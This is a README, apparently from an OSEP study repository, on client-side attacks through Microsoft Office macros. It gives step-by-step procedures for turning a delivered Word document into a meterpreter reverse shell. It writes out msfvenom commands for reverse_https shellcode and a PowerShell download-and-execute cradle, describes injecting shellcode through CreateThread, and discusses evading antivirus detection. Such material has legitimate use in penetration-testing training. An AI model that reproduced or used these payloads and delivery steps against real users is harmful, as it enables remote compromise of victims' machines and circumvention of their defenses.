### Microsoft Office Attacks.

The client-side attacks based on Microsoft Office's programs is a type of attack that involves the macros feature of Microsoft Office tools in a procedure that leads to RCE on victim's host.

In this repository we can find some scripts and procedures to craft and test macros that run arbitrary code when this gets open, but the are three main ways to gain RCE leveraging this scripts.

<br>

### Simple VBA way.

The simply VBA way works with in an enviroment with no AV or EDR mechanism enabled.

1. We craft a meterpreter executable with the help of [msfvenomPayloads.sh](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/msfvenomPayloads.sh) script.

2. Then, we make use of [PSHTTPDownloader.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/PSHTTPDownloader.vba) in order to download and store in the victim machine the msfvenom payload we crafted before and then we execute it. 

3. Finally, with the contents PSHTTPDownloader.vba properly formed, we make a [macro](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/README.md) on a Word document and deliver the document. 

4. We retrieve the connection by using a [listener](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/Listener.sh).

Is worth to mention that, because we store the malware on the hard disk (since we download a binary), an AV can detect malicious hash on this file and because we simply execute the payload, we create a new process that is checked by the AV before it get properly executed so is also suscetible to be caneceled.

Thus, we terminate this part by saying that this method of gain RCE on a machine is highly insecure.

<br>

### Inyecting shellcode on an existing process.

There are more sofistaced ways to gain RCE that avoids defense mechanism, here we will see two; with VBA and with PowerShell mixed with VBA.

<br>

#### The VBA way.

We can directly create a macro that stores a shellcode and execute it.

1. First we create a Shellcode for a 'vbaapplication' making use of [ShellCode.sh](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/ShellCode.sh)

    ```shell
    msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<LPORT> EXITFUNC=thread -f vbapplication
    ```

2. Then, make use of the [ShellCode.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/ShellCode.vba) and paste on it the crafted shellcode replacing the *buf* variable. 

3. With the ShellCode.vba finished, we make a [macro](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/README.md) on a Word document and deliver the document.

4. We retrieve the connection by using a [listener](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/Listener.sh).


This method is kind of more reliable than the one before because the ShellCode.vba make use of a Win32 API; *CreateThread*, that creates an execution thread on the current process (inyecting code) effectively bypassing the execution process cheking by the AV that only happens at the launching of a new process. 

However, this still a dangerous way because we still storing malicious code on the hardisk; the proper shellcode.vba macro.

<br>

#### Make use of PowerShell resources.

We can execute the code of a remote script by using some Powershell methods.

1. First we craft our shellcode with the help of [ShellCode.sh](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/ShellCode.sh) file for a 'ps1' application, this is:

    ```shell
    msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f ps1
    ```
2. Once we craft it, we paste it in the '$buf' variable of [VBAenvlauncher.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/VBAenvlauncher.ps1) or [InyectionShellcode.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/InyectionShellcode.ps1) script.

3. Then, we make use of [LaunchinApp_Shell.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/LaunchinApp_Shell.vba) to execute a PowerShell program that downloads and executes the prepared VBAenvlauncher.ps1 script. The line stored on the *str* var must be:

    ```powershell
    powershell (New-Object System.Net.WebClient).DownloadString('<URL>') | IEX
    ```

    Replacing the \<URL\> with the proper vaules.

4. We retrieve the connection by using a [listener](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/Listener.sh).

Thus, we inyect in the flow of execution of an existing proces the contents of a script which not exist on the current system soc cannot be detected with the AV.

The rest of scripts present on this repository are only to help the reader to understand the main scripts necesary to perform the operation. 

<br>